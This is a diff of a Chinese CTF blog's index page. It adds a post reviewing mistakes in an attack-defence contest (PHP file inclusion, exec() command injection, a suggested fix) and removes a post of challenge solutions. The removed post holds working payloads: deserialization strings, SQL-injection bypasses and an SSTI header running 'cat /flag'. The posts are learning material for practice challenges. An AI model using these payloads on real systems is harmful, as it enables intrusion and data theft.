@@ -71,6 +71,95 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-byb2019线下awd" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/04/19/byb2019%E7%BA%BF%E4%B8%8Bawd/" class="article-date">
+  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/04/19/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="百越杯总结"><a href="#百越杯总结" class="headerlink" title="百越杯总结"></a>百越杯总结</h1><h2 id="include-require"><a href="#include-require" class="headerlink" title="include,require"></a>include,require</h2><p>如果<strong>文件被包含两次</strong>，PHP 5   <strong>发出致命错误</strong>因为函数已经被定义，但是 PHP 4 不会对在   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.return.html">return</a> 之后定义的函数报错。推荐使用   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include-once.html">include_once</a> 而不是检查文件是否已包含并在包含文件中有条件返回。 </p>
+<h2 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once,require_once"></a>include_once,require_once</h2><p><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include.html">include</a>   语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。</p>
+<p><em>require_once</em> 语句和 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.require.html">require</a>   语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 </p>
+<p><strong>如果所包含文件不存在,include_once不会退出,而require_once会直接退出</strong></p>
+<h2 id="比赛失误原因"><a href="#比赛失误原因" class="headerlink" title="比赛失误原因"></a>比赛失误原因</h2><h3 id="log没挂好"><a href="#log没挂好" class="headerlink" title="log没挂好"></a>log没挂好</h3><h3 id="没有找到有效的攻击流量"><a href="#没有找到有效的攻击流量" class="headerlink" title="没有找到有效的攻击流量"></a>没有找到有效的攻击流量</h3><p>grep这个命令不够熟悉,</p>
+<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>我的过滤条件变迁:</p>
+<p><code>&quot;flag&quot; =&gt; &quot;/flag&quot;</code>,到这里后我就没有继续过滤,”/flag”其实还是有很多干扰信息的,我就差一步</p>
+<p><code>grep &quot;/flag &quot; */* </code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fl7ptrij30k20arac7.jpg" alt="image.png"></p>
+<p><code>grep &quot;/flag &quot; */* -C300 | grep &quot;end pageheader&quot; -C 10</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fk6h3jxj30oa05cdfx.jpg" alt="image.png"></p>
+<h3 id="没找到的洞"><a href="#没找到的洞" class="headerlink" title="没找到的洞"></a>没找到的洞</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c2qcxxyj30pl01vdgk.jpg" alt="image.png"></p>
+<p>php的web主要也就这两的洞</p>
+<h4 id="grayscale"><a href="#grayscale" class="headerlink" title="grayscale"></a>grayscale</h4><p><code>include $_GET[&#39;img&#39;];</code>配合有后门的图片m.jpg</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c4zci7cj30f001g3yg.jpg" alt="image.png"></p>
+<p>开始我直接搜索<code>&lt;?</code>和<code>&lt;%</code> 没搜索到就以为是误报,??也能执行?????</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c93p00wj307100zjr6.jpg" alt="image.png"></p>
+<p>用strings查看////,编码问题导致??,以后用ascii码来查看</p>
+<h4 id="ssystem"><a href="#ssystem" class="headerlink" title="ssystem"></a>ssystem</h4><p>虽然找到了exec那个洞</p>
+<p>但是在index.php中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&#x27;chart.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&quot;<span class="subst">$page</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以配合文件上传拿到shell或者是直接include /flag也能拿到flag</p>
+<h3 id="洞没修好"><a href="#洞没修好" class="headerlink" title="洞没修好"></a>洞没修好</h3><h4 id="SSystem"><a href="#SSystem" class="headerlink" title="SSystem"></a>SSystem</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    exec(<span class="string">&quot;tar -cf backup/<span class="subst">$name</span> images/*.jpg&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;</span></span><br><span class="line"><span class="string">            导出成功,&lt;a href=&#x27;backup/<span class="subst">$name</span>&#x27;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>原本以为<code>$name</code>再参数位置,用escapeshellarg就可以了</p>
+<p>但是!!!!!!!虽然escapeshellarg会把$name放在引号里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 </span><br></pre></td></tr></table></figure>
+
+<p>php手册里解释是单引号,实际却是<code>tar -cf backup/&quot;123&quot; images/*.jpg</code></p>
+<p>?????这是在我本机php5.6的环境下,php7环境也是双引号???</p>
+<p>然后在自己的服务器上之前是双引号后面是单引号????</p>
+<p>由于不知道靶场上会怎样,我也不确定我用escapeshellarg是不是修好了,然后这题就修补失败了</p>
+<p>比较好的修复方案(在实现原功能的情况下去掉命令执行):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;tar -cf backup/aa.tar images/*.jpg&quot;);</span><br><span class="line">rename(&quot;backup/aa.tar&quot;,&quot;backup/$name.tar&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="没找到check没过的原因"><a href="#没找到check没过的原因" class="headerlink" title="没找到check没过的原因"></a>没找到check没过的原因</h3><p>check的id是172.16.4.7</p>
+<p>但是直接搜索 HTTP 没找到check没过的原因,我猜因为拖下来的log只有前半小时,而开局的是否我们的check好像是过的</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我看到洞的时候没有修好</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2020/04/19/byb2019%E7%BA%BF%E4%B8%8Bawd/" data-id="ckubfvk2u0037dcn8ewp14488" data-title="百越杯总结" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-bytectfwp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/04/19/bytectfwp/" class="article-date">
@@ -140,7 +229,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/bytectfwp/" data-id="cku8ky2y0003hdnnf6evoclaj" data-title="bytectf wp" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/bytectfwp/" data-id="ckubfvk2z003ldcn8b2o21xi3" data-title="bytectf wp" class="article-share-link">Share</a>
       
       
       
@@ -341,7 +430,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/d3ctf2019/" data-id="cku8ky2y7003wdnnf9tav4ecm" data-title="d3ctf" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/d3ctf2019/" data-id="ckubfvk340040dcn8fqs58zo0" data-title="d3ctf" class="article-share-link">Share</a>
       
       
       
@@ -419,7 +508,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/eis2019/" data-id="cku8ky2ye004bdnnf1k2o3iiq" data-title="eis2019" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/eis2019/" data-id="ckubfvk38004edcn88tem1blb" data-title="eis2019" class="article-share-link">Share</a>
       
       
       
@@ -551,7 +640,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/nbctf/" data-id="cku8ky2yv0056dnnfbnc76il8" data-title="newbie ctf 2019" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/nbctf/" data-id="ckubfvk3j0059dcn853hyebag" data-title="newbie ctf 2019" class="article-share-link">Share</a>
       
       
       
@@ -680,7 +769,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/roarctf2019/" data-id="cku8ky2z6005zdnnffcq027cf" data-title="roarctf2019" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/roarctf2019/" data-id="ckubfvk3s0062dcn8fer8bp5y" data-title="roarctf2019" class="article-share-link">Share</a>
       
       
       
@@ -783,7 +872,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/tuctf/" data-id="cku8ky2zc006ddnnfd5a96ko7" data-title="tuctf2019" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/tuctf/" data-id="ckubfvk3w006gdcn88c28hp7f" data-title="tuctf2019" class="article-share-link">Share</a>
       
       
       
@@ -881,7 +970,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/unctf2019/" data-id="cku8ky2zd006gdnnfb6fdg53x" data-title="unctf2019" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/unctf2019/" data-id="ckubfvk3x006kdcn8gkp0cnni" data-title="unctf2019" class="article-share-link">Share</a>
       
       
       
@@ -921,7 +1010,7 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p><a href="mailto:&#97;&#x62;&#x63;&#100;&#101;&#102;&#103;&#104;&#x69;&#x6a;&#x31;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;">&#97;&#x62;&#x63;&#100;&#101;&#102;&#103;&#104;&#x69;&#x6a;&#x31;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;</a></p>
+        <h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p><a href="mailto:&#x61;&#x62;&#x63;&#100;&#x65;&#x66;&#x67;&#x68;&#x69;&#x6a;&#x31;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;">&#x61;&#x62;&#x63;&#100;&#x65;&#x66;&#x67;&#x68;&#x69;&#x6a;&#x31;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;</a></p>
 <p>黑名单:union</p>
 <p><code>fuckyoufuck&#39;/**/or/**/1^&#39;0</code></p>
 <p>最后payload:<code>admin&#39;/*ffuuucckyou*/or/**/&#39;</code></p>
@@ -956,7 +1045,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" data-id="cku8ky2zo007cdnnf8xpr41r0" data-title="巅峰极客" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" data-id="ckubfvk48007fdcn805eq127k" data-title="巅峰极客" class="article-share-link">Share</a>
       
       
       
@@ -1042,134 +1131,10 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/04/02/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" data-id="cku8ky2z2005odnnf4ixl07jj" data-title="phpmyadmin_登陆后_rce" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/04/02/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" data-id="ckubfvk3p005sdcn8c4gt3xln" data-title="phpmyadmin_登陆后_rce" class="article-share-link">Share</a>
       
       
       
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-3月做题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/03/31/3%E6%9C%88%E5%81%9A%E9%A2%98/" class="article-date">
-  <time class="dt-published" datetime="2020-03-31T16:00:00.000Z" itemprop="datePublished">2020-04-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/03/31/3%E6%9C%88%E5%81%9A%E9%A2%98/">3月做题</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="3月做题"><a href="#3月做题" class="headerlink" title="3月做题"></a>3月做题</h1><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure>
-
-<p>我们利用filter来吞掉一些字符,从而让我们任意反序列化</p>
-<p><code>POST: _SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:12:&quot;aW5kZXgucGhw&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</code></p>
-<p>我们分析一下为什么是这个payload:</p>
-<p>…</p>
-<p>在phpinfo中找到</p>
-<table>
-<thead>
-<tr>
-<th>config</th>
-<th>Local Value</th>
-<th>Mastr Value</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>auto_append_file</td>
-<td>d0g3_f1ag.php</td>
-<td>d0g3_f1ag.php</td>
-</tr>
-</tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>flag&#123;62b16099-c29d-499a-9dde-e54bf2985b31&#125;</code></p>
-<h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
-
-<p>md5($var,true)会返回一个原始的二进制数据，某些数据会被当成字符串</p>
-<blockquote>
-<p>raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。</p>
-</blockquote>
-<p>   特殊字符串:</p>
-<blockquote>
-<p>129581926211651571912466741651878684928<br>ffifdyop</p>
-</blockquote>
-<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$x=handsome $y=flag</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
-
-<p><code>/index.php?yds=flag</code></p>
-<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>根据题目的提示,修改xff头,发现可以修改ip,但是修改成127.0.0.1后没有啥东西</p>
-<p>后来在fuzz的过程中发现,有ssti漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: node3.buuoj.cn:27223</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: &#123;system(&#x27;cat /flag&#x27;)&#125;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: 